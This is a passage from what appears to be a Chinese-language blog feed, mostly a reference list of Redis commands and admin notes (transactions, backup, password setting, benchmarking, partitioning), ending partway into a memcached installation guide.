value</li></ol><blockquote><p>如果 key 已经存在并且是一个字符串， APPEND 命令将指定的 value 追加到该 key 原来值（value）的末尾。</p></blockquote><h1 id="Redis-Hash操作"><a href="#Redis-Hash操作" class="headerlink" title="Redis Hash操作"></a>Redis Hash操作</h1><blockquote><p>Redis hash 是一个string类型的field和value的映射表，hash特别适合用于存储对象。</p></blockquote><blockquote><p>Redis 中每个 hash 可以存储 232 - 1 键值对（40多亿）。</p></blockquote><ol><li>HMSET key field1 value1 [field2 value2 ] </li></ol><blockquote><p>同时将多个 field-value (域-值)对设置到哈希表 key 中。</p></blockquote><ol start="2"><li>HDEL key field1 [field2] </li></ol><blockquote><p>删除一个或多个哈希表字段</p></blockquote><ol start="3"><li>HEXISTS key field </li></ol><blockquote><p>查看哈希表 key 中，指定的字段是否存在。</p></blockquote><ol start="4"><li>HGET key field </li></ol><blockquote><p>获取存储在哈希表中指定字段的值。</p></blockquote><ol start="5"><li>HGETALL key </li></ol><blockquote><p>获取在哈希表中指定 key 的所有字段和值</p></blockquote><ol start="6"><li>HINCRBY key field increment </li></ol><blockquote><p>为哈希表 key 中的指定字段的整数值加上增量 increment 。</p></blockquote><ol start="7"><li>HINCRBYFLOAT key field increment </li></ol><blockquote><p>为哈希表 key 中的指定字段的浮点数值加上增量 increment 。</p></blockquote><ol start="8"><li>HKEYS key </li></ol><blockquote><p>获取所有哈希表中的字段</p></blockquote><ol start="9"><li>HLEN key </li></ol><blockquote><p>获取哈希表中字段的数量</p></blockquote><ol start="10"><li>HMGET key field1 [field2] </li></ol><blockquote><p>获取所有给定字段的值</p></blockquote><ol start="11"><li>HSET key field value </li></ol><blockquote><p>将哈希表 key 中的字段 field 的值设为 value 。</p></blockquote><ol start="12"><li>HSETNX key field value </li></ol><blockquote><p>只有在字段 field 不存在时，设置哈希表字段的值。</p></blockquote><ol start="13"><li>HVALS key </li></ol><blockquote><p>获取哈希表中所有值</p></blockquote><ol start="14"><li>HSCAN key cursor [MATCH pattern] [COUNT count] </li></ol><blockquote><p>迭代哈希表中的键值对。</p></blockquote><h1 id="Redis-List操作"><a href="#Redis-List操作" class="headerlink" title="Redis List操作"></a>Redis List操作</h1><blockquote><p>Redis列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边</p></blockquote><blockquote><p>一个列表最多可以包含 2的32-1次方 个元素 (4294967295, 每个列表超过40亿个元素)。</p></blockquote><ol><li>RPUSHX key value </li></ol><blockquote><p>为已存在的列表添加值 尾部</p></blockquote><ol start="2"><li>LPUSH key value1 [value2] </li></ol><blockquote><p>将一个或多个值插入到列表头部</p></blockquote><ol start="3"><li>BLPOP key1 [key2 ] timeout </li></ol><blockquote><p>移出并获取列表的第一个元素， 如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。</p></blockquote><ol start="4"><li>BRPOP key1 [key2 ] timeout </li></ol><blockquote><p>移出并获取列表的最后一个元素， 如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。</p></blockquote><ol start="5"><li>BRPOPLPUSH source destination timeout </li></ol><blockquote><p>从列表中弹出一个值，将弹出的元素插入到另外一个列表中并返回它； 如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。</p></blockquote><ol start="6"><li>LINDEX key index </li></ol><blockquote><p>通过索引获取列表中的元素</p></blockquote><ol start="7"><li>LINSERT key BEFORE|AFTER pivot value </li></ol><blockquote><p>在列表的元素前或者后插入元素</p></blockquote><ol start="8"><li>LLEN key </li></ol><blockquote><p>获取列表长度</p></blockquote><ol start="9"><li>LPOP key </li></ol><blockquote><p>移出并获取列表的第一个元素</p></blockquote><ol start="10"><li>LPUSHX key value </li></ol><blockquote><p>将一个值插入到已存在的列表头部</p></blockquote><ol start="11"><li>LRANGE key start stop </li></ol><blockquote><p>获取列表指定范围内的元素</p></blockquote><ol start="12"><li>LREM key count value </li></ol><blockquote><p>移除列表元素</p></blockquote><ol start="13"><li>LSET key index value </li></ol><blockquote><p>通过索引设置列表元素的值</p></blockquote><ol start="14"><li>LTRIM key start stop </li></ol><blockquote><p>对一个列表进行修剪(trim)，就是说，让列表只保留指定区间内的元素，不在指定区间之内的元素都将被删除。</p></blockquote><ol start="15"><li>RPOP key </li></ol><blockquote><p>移除列表的最后一个元素，返回值为移除的元素。</p></blockquote><ol start="16"><li>RPOPLPUSH source destination </li></ol><blockquote><p>移除列表的最后一个元素，并将该元素添加到另一个列表并返回</p></blockquote><ol start="17"><li>RPUSH key value1 [value2] </li></ol><blockquote><p>在列表中添加一个或多个值</p></blockquote><h1 id="Redis-Set操作"><a href="#Redis-Set操作" class="headerlink" title="Redis Set操作"></a>Redis Set操作</h1><blockquote><p>Redis 的 Set 是 String 类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。<br>Redis 中集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是 O(1)。</p></blockquote><blockquote><p>集合中最大的成员数为 2的32-1次方 (4294967295, 每个集合可存储40多亿个成员)。</p></blockquote><ol><li>SADD key member1 [member2] </li></ol><blockquote><p>向集合添加一个或多个成员</p></blockquote><ol start="2"><li>SCARD key </li></ol><blockquote><p>获取集合的成员数</p></blockquote><ol start="3"><li>SDIFF key1 [key2] </li></ol><blockquote><p>返回给定所有集合的差集</p></blockquote><ol start="4"><li>SDIFFSTORE destination key1 [key2] </li></ol><blockquote><p>返回给定所有集合的差集并存储在 destination 中</p></blockquote><ol start="5"><li>SINTER key1 [key2] </li></ol><blockquote><p>返回给定所有集合的交集</p></blockquote><ol start="6"><li>SINTERSTORE destination key1 [key2] </li></ol><blockquote><p>返回给定所有集合的交集并存储在 destination 中</p></blockquote><ol start="7"><li>SISMEMBER key member </li></ol><blockquote><p>判断 member 元素是否是集合 key 的成员</p></blockquote><ol start="8"><li>SMEMBERS key </li></ol><blockquote><p>返回集合中的所有成员</p></blockquote><ol start="9"><li>SMOVE source destination member </li></ol><blockquote><p>将 member 元素从 source 集合移动到 destination 集合</p></blockquote><ol start="10"><li>SPOP key </li></ol><blockquote><p>移除并返回集合中的一个随机元素</p></blockquote><ol start="11"><li>SRANDMEMBER key [count] </li></ol><blockquote><p>返回集合中一个或多个随机数</p></blockquote><ol start="12"><li>SREM key member1 [member2] </li></ol><blockquote><p>移除集合中一个或多个成员</p></blockquote><ol start="13"><li>SUNION key1 [key2] </li></ol><blockquote><p>返回所有给定集合的并集</p></blockquote><ol start="14"><li>SUNIONSTORE destination key1 [key2] </li></ol><blockquote><p>所有给定集合的并集存储在 destination 集合中</p></blockquote><ol start="15"><li>SSCAN key cursor [MATCH pattern] [COUNT count] </li></ol><blockquote><p>迭代集合中的元素</p></blockquote><h1 id="Redis-sorted-set操作（有序集合）"><a href="#Redis-sorted-set操作（有序集合）" class="headerlink" title="Redis sorted set操作（有序集合）"></a>Redis sorted set操作（有序集合）</h1><blockquote><p>Redis 有序集合和集合一样也是string类型元素的集合,且不允许重复的成员。<br>不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。<br>有序集合的成员是唯一的,但分数(score)却可以重复。</p></blockquote><blockquote><p>集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。 集合中最大的成员数为 2的32-1次方 (4294967295, 每个集合可存储40多亿个成员)。</p></blockquote><blockquote><p>原文中说，集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)其实不太准确。</p></blockquote><blockquote><p>其实在redis sorted sets里面当items内容大于64的时候同时使用了hash和skiplist两种设计实现。这也会为了排序和查找性能做的优化。所以如上可知：<br>添加和删除都需要修改skiplist，所以复杂度为O(log(n))。<br>但是如果仅仅是查找元素的话可以直接使用hash，其复杂度为O(1)<br>其他的range操作复杂度一般为O(log(n))<br>当然如果是小于64的时候，因为是采用了ziplist的设计，其时间复杂度为O(n)  </p></blockquote><ol><li>ZADD key score1 member1 [score2 member2] </li></ol><blockquote><p>向有序集合添加一个或多个成员，或者更新已存在成员的分数</p></blockquote><ol start="2"><li>ZCARD key </li></ol><blockquote><p>获取有序集合的成员数</p></blockquote><ol start="3"><li>ZCOUNT key min max </li></ol><blockquote><p>计算在有序集合中指定区间分数的成员数</p></blockquote><ol start="4"><li>ZINCRBY key increment member </li></ol><blockquote><p>有序集合中对指定成员的分数加上增量 increment</p></blockquote><ol start="5"><li>ZINTERSTORE destination numkeys key [key …] </li></ol><blockquote><p>计算给定的一个或多个有序集的交集并将结果集存储在新的有序集合 key 中</p></blockquote><ol start="6"><li>ZLEXCOUNT key min max </li></ol><blockquote><p>在有序集合中计算指定字典区间内成员数量</p></blockquote><ol start="7"><li>ZRANGE key start stop [WITHSCORES] </li></ol><blockquote><p>通过索引区间返回有序集合成指定区间内的成员</p></blockquote><ol start="8"><li>ZRANGEBYLEX key min max [LIMIT offset count] </li></ol><blockquote><p>通过字典区间返回有序集合的成员</p></blockquote><ol start="9"><li>ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT] </li></ol><blockquote><p>通过分数返回有序集合指定区间内的成员</p></blockquote><ol start="10"><li>ZRANK key member </li></ol><blockquote><p>返回有序集合中指定成员的索引</p></blockquote><ol start="11"><li>ZREM key member [member …] </li></ol><blockquote><p>移除有序集合中的一个或多个成员</p></blockquote><ol start="12"><li>ZREMRANGEBYLEX key min max </li></ol><blockquote><p>移除有序集合中给定的字典区间的所有成员</p></blockquote><ol start="13"><li>ZREMRANGEBYRANK key start stop </li></ol><blockquote><p>移除有序集合中给定的排名区间的所有成员</p></blockquote><ol start="14"><li>ZREMRANGEBYSCORE key min max </li></ol><blockquote><p>移除有序集合中给定的分数区间的所有成员</p></blockquote><ol start="15"><li>ZREVRANGE key start stop [WITHSCORES] </li></ol><blockquote><p>返回有序集中指定区间内的成员，通过索引，分数从高到底</p></blockquote><ol start="16"><li>ZREVRANGEBYSCORE key max min [WITHSCORES] </li></ol><blockquote><p>返回有序集中指定分数区间内的成员，分数从高到低排序</p></blockquote><ol start="17"><li>ZREVRANK key member </li></ol><blockquote><p>返回有序集合中指定成员的排名，有序集成员按分数值递减(从大到小)排序</p></blockquote><ol start="18"><li>ZSCORE key member </li></ol><blockquote><p>返回有序集中，成员的分数值</p></blockquote><ol start="19"><li>ZUNIONSTORE destination numkeys key [key …] </li></ol><blockquote><p>计算给定的一个或多个有序集的并集，并存储在新的 key 中</p></blockquote><ol start="20"><li>ZSCAN key cursor [MATCH pattern] [COUNT count] </li></ol><blockquote><p>迭代有序集合中的元素（包括元素成员和元素分值）</p></blockquote><h1 id="Redis-HyperLogLog操作"><a href="#Redis-HyperLogLog操作" class="headerlink" title="Redis HyperLogLog操作"></a>Redis HyperLogLog操作</h1><blockquote><p>Redis HyperLogLog 是用来做基数统计的算法，HyperLogLog 的优点是，在输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定 的、并且是很小的。</p></blockquote><blockquote><p>在 Redis 里面，每个 HyperLogLog 键只需要花费 12 KB 内存，就可以计算接近 2^64 个不同元素的基 数。这和计算基数时，元素越多耗费内存就越多的集合形成鲜明对比。</p></blockquote><blockquote><p>但是，因为 HyperLogLog 只会根据输入元素来计算基数，而不会储存输入元素本身，所以 HyperLogLog 不能像集合那样，返回输入的各个元素</p></blockquote><p>什么是基数?</p><blockquote><p>比如数据集 {1, 3, 5, 7, 5, 7, 8}， 那么这个数据集的基数集为 {1, 3, 5 ,7, 8}, 基数(不重复元素)为5。 基数估计就是在误差可接受的范围内，快速计算基数。</p></blockquote><ol><li>PFADD key element [element …] </li></ol><blockquote><p>添加指定元素到 HyperLogLog 中。</p></blockquote><ol start="2"><li>PFCOUNT key [key …] </li></ol><blockquote><p>返回给定 HyperLogLog 的基数估算值。</p></blockquote><ol start="3"><li>PFMERGE destkey sourcekey [sourcekey …] </li></ol><blockquote><p>将多个 HyperLogLog 合并为一个 HyperLogLog</p></blockquote><h1 id="Redis-发布订阅"><a href="#Redis-发布订阅" class="headerlink" title="Redis 发布订阅"></a>Redis 发布订阅</h1><blockquote><p>Redis 发布订阅(pub/sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。</p></blockquote><blockquote><p>Redis 客户端可以订阅任意数量的频道。</p></blockquote><p>流程： 一个客户端订阅，另一个客户端想同一个频道push消息</p><ol><li>PSUBSCRIBE pattern [pattern …] </li></ol><blockquote><p>订阅一个或多个符合给定模式的频道。</p></blockquote><ol start="2"><li>PUBSUB subcommand [argument [argument …]] </li></ol><blockquote><p>查看订阅与发布系统状态。</p></blockquote><ol start="3"><li>PUBLISH channel message </li></ol><blockquote><p>将信息发送到指定的频道。</p></blockquote><ol start="4"><li>PUNSUBSCRIBE [pattern [pattern …]] </li></ol><blockquote><p>退订所有给定模式的频道。</p></blockquote><ol start="5"><li>SUBSCRIBE channel [channel …] </li></ol><blockquote><p>订阅给定的一个或多个频道的信息。</p></blockquote><ol start="6"><li>UNSUBSCRIBE [channel [channel …]] </li></ol><blockquote><p>指退订给定的频道。</p></blockquote><h1 id="Redis-事务操作"><a href="#Redis-事务操作" class="headerlink" title="Redis 事务操作"></a>Redis 事务操作</h1><blockquote><p>Redis 事务可以一次执行多个命令， 并且带有以下两个重要的保证：</p></blockquote><ul><li>批量操作在发送 EXEC 命令前被放入队列缓存。</li><li>收到 EXEC 命令后进入事务执行，事务中任意命令执行失败，其余的命令依然被执行。</li><li>在事务执行过程，其他客户端提交的命令请求不会插入到事务执行命令序列中。</li></ul><blockquote><p>一个事务从开始到执行会经历以下三个阶段：</p></blockquote><ul><li>开始事务。</li><li>命令入队。</li><li>执行事务。</li></ul><pre><code># 例子redis 127.0.0.1:6379&gt; MULTIOKredis 127.0.0.1:6379&gt; SET book-name &quot;Mastering C++ in 21 days&quot;QUEUEDredis 127.0.0.1:6379&gt; GET book-nameQUEUEDredis 127.0.0.1:6379&gt; SADD tag &quot;C++&quot; &quot;Programming&quot; &quot;Mastering Series&quot;QUEUEDredis 127.0.0.1:6379&gt; SMEMBERS tagQUEUEDredis 127.0.0.1:6379&gt; EXEC1) OK2) &quot;Mastering C++ in 21 days&quot;3) (integer) 34) 1) &quot;Mastering Series&quot;   2) &quot;C++&quot;   3) &quot;Programming&quot;</code></pre><p>注意</p><blockquote><p>单个 Redis 命令的执行是原子性的，但 Redis 没有在事务上增加任何维持原子性的机制，所以 Redis 事务的执行并不是原子性的。</p></blockquote><blockquote><p>事务可以理解为一个打包的批量执行脚本，但批量指令并非原子化的操作，中间某条指令的失败不会导致前面已做指令的回滚，也不会造成后续的指令不做。</p></blockquote><ol><li>DISCARD </li></ol><blockquote><p>取消事务，放弃执行事务块内的所有命令。</p></blockquote><ol start="2"><li>EXEC </li></ol><blockquote><p>执行所有事务块内的命令。</p></blockquote><ol start="3"><li>MULTI </li></ol><blockquote><p>标记一个事务块的开始。</p></blockquote><ol start="4"><li>UNWATCH </li></ol><blockquote><p>取消 WATCH 命令对所有 key 的监视。</p></blockquote><ol start="5"><li>WATCH key [key …] </li></ol><blockquote><p>监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断。</p></blockquote><h1 id="Redis-脚本（Lua语法）"><a href="#Redis-脚本（Lua语法）" class="headerlink" title="Redis 脚本（Lua语法）"></a>Redis 脚本（Lua语法）</h1><ol><li>EVAL script numkeys key [key …] arg [arg …] </li></ol><blockquote><p>执行 Lua 脚本。</p></blockquote><ol start="2"><li>EVALSHA sha1 numkeys key [key …] arg [arg …] </li></ol><blockquote><p>执行 Lua 脚本。</p></blockquote><ol start="3"><li>SCRIPT EXISTS script [script …] </li></ol><blockquote><p>查看指定的脚本是否已经被保存在缓存当中。</p></blockquote><ol start="4"><li>SCRIPT FLUSH </li></ol><blockquote><p>从脚本缓存中移除所有脚本。</p></blockquote><ol start="5"><li>SCRIPT KILL </li></ol><blockquote><p>杀死当前正在运行的 Lua 脚本。</p></blockquote><ol start="6"><li>SCRIPT LOAD script </li></ol><blockquote><p>将脚本 script 添加到脚本缓存中，但并不立即执行这个脚本。</p></blockquote><h1 id="Redis-连接"><a href="#Redis-连接" class="headerlink" title="Redis 连接"></a>Redis 连接</h1><ol><li>AUTH password </li></ol><blockquote><p>验证密码是否正确</p></blockquote><ol start="2"><li>ECHO message </li></ol><blockquote><p>打印字符串</p></blockquote><ol start="3"><li>PING </li></ol><blockquote><p>查看服务是否运行</p></blockquote><ol start="4"><li>QUIT </li></ol><blockquote><p>关闭当前连接</p></blockquote><ol start="5"><li>SELECT index </li></ol><blockquote><p>切换到指定的数据库</p></blockquote><h1 id="Redis-服务器"><a href="#Redis-服务器" class="headerlink" title="Redis 服务器"></a>Redis 服务器</h1><blockquote><p>Redis 服务器命令主要是用于管理 redis 服务。</p></blockquote><ol><li>BGREWRITEAOF </li></ol><blockquote><p>异步执行一个 AOF（AppendOnly File） 文件重写操作</p></blockquote><ol start="2"><li>BGSAVE </li></ol><blockquote><p>在后台异步保存当前数据库的数据到磁盘</p></blockquote><ol start="3"><li>CLIENT KILL [ip:port] [ID client-id] </li></ol><blockquote><p>关闭客户端连接</p></blockquote><ol start="4"><li>CLIENT LIST </li></ol><blockquote><p>获取连接到服务器的客户端连接列表</p></blockquote><ol start="5"><li>CLIENT GETNAME </li></ol><blockquote><p>获取连接的名称</p></blockquote><ol start="6"><li>CLIENT PAUSE timeout </li></ol><blockquote><p>在指定时间内终止运行来自客户端的命令</p></blockquote><ol start="7"><li>CLIENT SETNAME connection-name </li></ol><blockquote><p>设置当前连接的名称</p></blockquote><ol start="8"><li>CLUSTER SLOTS </li></ol><blockquote><p>获取集群节点的映射数组</p></blockquote><ol start="9"><li>COMMAND </li></ol><blockquote><p>获取 Redis 命令详情数组</p></blockquote><ol start="10"><li>COMMAND COUNT </li></ol><blockquote><p>获取 Redis 命令总数</p></blockquote><ol start="11"><li>COMMAND GETKEYS </li></ol><blockquote><p>获取给定命令的所有键</p></blockquote><ol start="12"><li>TIME </li></ol><blockquote><p>返回当前服务器时间</p></blockquote><ol start="13"><li>COMMAND INFO command-name [command-name …] </li></ol><blockquote><p>获取指定 Redis 命令描述的数组</p></blockquote><ol start="14"><li>CONFIG GET parameter </li></ol><blockquote><p>获取指定配置参数的值</p></blockquote><ol start="15"><li>CONFIG REWRITE </li></ol><blockquote><p>对启动 Redis 服务器时所指定的 redis.conf 配置文件进行改写</p></blockquote><ol start="16"><li>CONFIG SET parameter value </li></ol><blockquote><p>修改 redis 配置参数，无需重启</p></blockquote><ol start="17"><li>CONFIG RESETSTAT </li></ol><blockquote><p>重置 INFO 命令中的某些统计数据</p></blockquote><ol start="18"><li>DBSIZE </li></ol><blockquote><p>返回当前数据库的 key 的数量</p></blockquote><ol start="19"><li>DEBUG OBJECT key </li></ol><blockquote><p>获取 key 的调试信息</p></blockquote><ol start="20"><li>DEBUG SEGFAULT </li></ol><blockquote><p>让 Redis 服务崩溃</p></blockquote><ol start="21"><li>FLUSHALL </li></ol><blockquote><p>删除所有数据库的所有key</p></blockquote><ol start="22"><li>FLUSHDB </li></ol><blockquote><p>删除当前数据库的所有key</p></blockquote><ol start="23"><li>INFO [section] </li></ol><blockquote><p>获取 Redis 服务器的各种信息和统计数值</p></blockquote><ol start="24"><li>LASTSAVE </li></ol><blockquote><p>返回最近一次 Redis 成功将数据保存到磁盘上的时间，以 UNIX 时间戳格式表示</p></blockquote><ol start="25"><li>MONITOR </li></ol><blockquote><p>实时打印出 Redis 服务器接收到的命令，调试用</p></blockquote><ol start="26"><li>ROLE </li></ol><blockquote><p>返回主从实例所属的角色</p></blockquote><ol start="27"><li>SAVE </li></ol><blockquote><p>同步保存数据到硬盘</p></blockquote><ol start="28"><li>SHUTDOWN [NOSAVE] [SAVE] </li></ol><blockquote><p>异步保存数据到硬盘，并关闭服务器</p></blockquote><ol start="29"><li>SLAVEOF host port </li></ol><blockquote><p>将当前服务器转变为指定服务器的从属服务器(slave server)</p></blockquote><ol start="30"><li>SLOWLOG subcommand [argument] </li></ol><blockquote><p>管理 redis 的慢日志</p></blockquote><ol start="31"><li>SYNC </li></ol><blockquote><p>用于复制功能(replication)的内部命令</p></blockquote><h1 id="Redis-数据备份与恢复"><a href="#Redis-数据备份与恢复" class="headerlink" title="Redis 数据备份与恢复"></a>Redis 数据备份与恢复</h1><pre><code>创建备份，将在 redis 安装目录中创建dump.rdb文件redis 127.0.0.1:6379&gt; SAVE OK恢复数据需要恢复数据，只需将备份文件 (dump.rdb) 移动到 redis 安装目录并启动服务即可。获取 redis 目录可以使用 CONFIG 命令redis 127.0.0.1:6379&gt; CONFIG GET dir1) &quot;dir&quot;2) &quot;/usr/local/redis/bin&quot;以上命令 CONFIG GET dir 输出的 redis 安装目录为 /usr/local/redis/binBgsave创建 redis 备份文件也可以使用命令 BGSAVE，该命令在后台执行。127.0.0.1:6379&gt; BGSAVEBackground saving started</code></pre><h1 id="Redis-安全"><a href="#Redis-安全" class="headerlink" title="Redis 安全"></a>Redis 安全</h1><pre><code>查看是否设置了密码验证127.0.0.1:6379&gt; CONFIG get requirepass1) &quot;requirepass&quot;2) &quot;&quot;默认情况下 requirepass 参数是空的，这就意味着你无需通过密码验证就可以连接到 redis 服务。你可以通过以下命令来修改该参数：127.0.0.1:6379&gt; CONFIG set requirepass &quot;runoob&quot;OK127.0.0.1:6379&gt; CONFIG get requirepass1) &quot;requirepass&quot;2) &quot;runoob&quot;设置密码后，客户端连接 redis 服务就需要密码验证，否则无法执行命令</code></pre><h1 id="Redis-性能测试"><a href="#Redis-性能测试" class="headerlink" title="Redis 性能测试"></a>Redis 性能测试</h1><pre><code>指令，linux下执行redis-benchmark [option] [option value]以下实例同时执行 10000 个请求来检测性能：$ redis-benchmark -n 10000  -q以下实例我们使用了多个参数来测试 redis 性能：$ redis-benchmark -h 127.0.0.1 -p 6379 -t set,lpush -n 10000 -q以上实例中主机为 127.0.0.1，端口号为 6379，执行的命令为 set,lpush，请求数为 10000，通过 -q 参数让结果只显示每秒执行的请求数</code></pre><p>可选参数如下</p><table><thead><tr><th>序号</th><th>选项</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td>1</td><td>-h</td><td>指定服务器主机名</td><td>127.0.0.1</td></tr><tr><td>2</td><td>-p</td><td>指定服务器端口</td><td>6379</td></tr><tr><td>3</td><td>-s</td><td>指定服务器 socket</td><td></td></tr><tr><td>4</td><td>-c</td><td>指定并发连接数</td><td>50</td></tr><tr><td>5</td><td>-n</td><td>指定请求数</td><td>10000</td></tr><tr><td>6</td><td>-d</td><td>以字节的形式指定 SET/GET 值的数据大小</td><td>2</td></tr><tr><td>7</td><td>-k</td><td>1=keep alive 0=reconnect</td><td>1</td></tr><tr><td>8</td><td>-r</td><td>SET/GET/INCR 使用随机 key, SADD 使用随机值</td><td></td></tr><tr><td>9</td><td>-P</td><td>通过管道传输 <numreq> 请求</td><td>1</td></tr><tr><td>10</td><td>-q</td><td>强制退出 redis。仅显示 query/sec 值</td><td></td></tr><tr><td>11</td><td>–csv</td><td>以 CSV 格式输出</td><td></td></tr><tr><td>12</td><td>-l</td><td>生成循环，永久执行测试</td><td></td></tr><tr><td>13</td><td>-t</td><td>仅运行以逗号分隔的测试命令列表。</td><td></td></tr><tr><td>14</td><td>-I</td><td>Idle 模式。仅打开 N 个 idle 连接并等待。</td><td></td></tr></tbody></table><h1 id="Redis-客户端连接"><a href="#Redis-客户端连接" class="headerlink" title="Redis 客户端连接"></a>Redis 客户端连接</h1><blockquote><p>Redis 通过监听一个 TCP 端口或者 Unix socket 的方式来接收来自客户端的连接，当一个连接建立后，Redis 内部会进行以下一些操作：</p></blockquote><ul><li>首先，客户端 socket 会被设置为非阻塞模式，因为 Redis 在网络事件处理上采用的是非阻塞多路复用模型。</li><li>然后为这个 socket 设置 TCP_NODELAY 属性，禁用 Nagle 算法</li><li>然后创建一个可读的文件事件用于监听这个客户端 socket 的数据发送</li></ul><pre><code>最大连接数，默认10000config get maxclients1) &quot;maxclients&quot;2) &quot;10000&quot;实例以下实例我们在服务启动时设置最大连接数为 100000：redis-server --maxclients 100000</code></pre><p>客户端命令</p><table><thead><tr><th>S.N.</th><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>CLIENT LIST</td><td>返回连接到 redis 服务的客户端列表</td></tr><tr><td>2</td><td>CLIENT SETNAME</td><td>设置当前连接的名称</td></tr><tr><td>3</td><td>CLIENT GETNAME</td><td>获取通过 CLIENT SETNAME 命令设置的服务名称</td></tr><tr><td>4</td><td>CLIENT PAUSE</td><td>挂起客户端连接，指定挂起的时间以毫秒计</td></tr><tr><td>5</td><td>CLIENT KILL</td><td>关闭客户端连接</td></tr></tbody></table><h1 id="Redis管道技术（找时间深入下）"><a href="#Redis管道技术（找时间深入下）" class="headerlink" title="Redis管道技术（找时间深入下）"></a>Redis管道技术（找时间深入下）</h1><blockquote><p>Redis是一种基于客户端-服务端模型以及请求/响应协议的TCP服务。这意味着通常情况下一个请求会遵循以下步骤：</p></blockquote><ul><li>客户端向服务端发送一个查询请求，并监听Socket返回，通常是以阻塞模式，等待服务端响应。</li><li>服务端处理命令，并将结果返回给客户端。</li></ul><p>Redis 管道技术</p><blockquote><p>Redis 管道技术可以在服务端未响应时，客户端可以继续向服务端发送请求，并最终一次性读取所有服务端的响应</p></blockquote><p>以上实例中我们通过使用 PING 命令查看redis服务是否可用， 之后我们设置了 runoobkey 的值为 redis，然后我们获取 runoobkey 的值并使得 visitor 自增 3 次。</p><p>在返回的结果中我们可以看到这些命令一次性向 redis 服务提交，并最终一次性读取所有服务端的响应</p><h1 id="Redis-分区"><a href="#Redis-分区" class="headerlink" title="Redis 分区"></a>Redis 分区</h1><blockquote><p>分区是分割数据到多个Redis实例的处理过程，因此每个实例只保存key的一个子集。</p></blockquote><p>优势</p><ul><li>通过利用多台计算机内存的和值，允许我们构造更大的数据库。</li><li>通过多核和多台计算机，允许我们扩展计算能力；通过多台计算机和网络适配器，允许我们扩展网络带宽。</li></ul><p>不足</p><ul><li>涉及多个key的操作通常是不被支持的。举例来说，当两个set映射到不同的redis实例上时，你就不能对这两个set执行交集操作。</li><li>涉及多个key的redis事务不能使用。</li><li>当使用分区时，数据处理较为复杂，比如你需要处理多个rdb/aof文件，并且从多个实例和主机备份持久化文件。</li><li>增加或删除容量也比较复杂。redis集群大多数支持在运行时增加、删除节点的透明数据平衡的能力，但是类似于客户端分区、代理等其他系统则不支持这项特性。然而，一种叫做presharding的技术对此是有帮助的。</li></ul><p>分区类型</p><blockquote><p>Redis 有两种类型分区。 假设有4个Redis实例 R0，R1，R2，R3，和类似user:1，user:2这样的表示用户的多个key，对既定的key有多种不同方式来选择这个key存放在哪个实例中。也就是说，有不同的系统来映射某个key到某个Redis服务。</p></blockquote><p>范围分区</p><blockquote><p>最简单的分区方式是按范围分区，就是映射一定范围的对象到特定的Redis实例。</p></blockquote><blockquote><p>比如，ID从0到10000的用户会保存到实例R0，ID从10001到 20000的用户会保存到R1，以此类推。</p></blockquote><blockquote><p>这种方式是可行的，并且在实际中使用，不足就是要有一个区间范围到实例的映射表。这个表要被管理，同时还需要各 种对象的映射表，通常对Redis来说并非是好的方法。</p></blockquote><p>哈希分区</p><blockquote><p>另外一种分区方法是hash分区。这对任何key都适用，也无需是object_name:这种形式，像下面描述的一样简单：</p></blockquote><ul><li>用一个hash函数将key转换为一个数字，比如使用crc32 hash函数。对key foobar执行crc32(foobar)会输出类似93024922的整数。</li><li>对这个整数取模，将其转化为0-3之间的数字，就可以将这个整数映射到4个Redis实例中的一个了。93024922 % 4 = 2，就是说key foobar应该被存到R2实例中。注意：取模操作是取除的余数，通常在多种编程语言中用%操作符实现。</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux memcached.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20memcached/"/>
      <url>/2019/12/03/deploy/linux/linux%20memcached/</url>
      
        <content type="html"><![CDATA[<p>官网： <a href="http://memcached.org/" target="_blank" rel="noopener">http://memcached.org/</a></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>参考： <a href="https://github.com/memcached/memcached/wiki/Install" target="_blank" rel="noopener">https://github.com/memcached/memcached/wiki/Install</a></p><p>linux</p><pre><code># 必须# Linux系统安装memcached，首先要先安装libevent库。sudo apt-get install libevent ibevent-dev         自动下载安装（Ubuntu/Debian）yum install libevent libevent-devel                    自动下载安装（Redhat/Fedora/Centos）# 官网 http://libevent.org/ 选择源码安装wget https://github.com/libevent/libevent/rele ases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gztar -zxvf libevent-2.1.8-stable.tar.gzcd libevent-2.1.8-stable./configure --prefix=/usr/local/libeventmake &amp;&amp; make installln -s /usr/local/lib/libevent-2.0.so.5 /usr/lib/libevent-2.1.so.6# 安装 Memcached# Ubuntu/Debiansudo apt-get install memcached# Redhat/Fedora/Centosyum install memcached# FreeBSDportmaster databases/memcached源码安装官网： http://memcached.orgwget http://memcached.org/latest                    下载最新版本tar -zxvf latest                                    解压源码cd memcached-1.x.x                                  进入目录./configure --prefix=/usr/local/memcached           配置make &amp;&amp; make test                                   编译sudo make install                                   安装</code></pre><p>运行</p><pre><code>$ /usr/local/memcached/bin/memcached -h                           命令帮助# 注意：如果使用自动安装 memcached 命令位于 /usr/local/bin/memcached。启动选项：-d是启动一个守护进程；-m是分配给Memcache使用的内存数量，单位是MB；-u是运行Memcache的用户；-l是监听的服务器IP地址，可以有多个地址；-p是设置Memcache监听的端口，，最好是1024以上的端口；-c是最大运行的并发连接数，默认是1024；-P是设置保存Memcache的pid文件。</code></pre><p>（1）作为前台程序运行：</p><p>root用户运行要带  -u root  参数</p><pre><code>/usr/local/memcached/bin/memcached -p 11211 -m 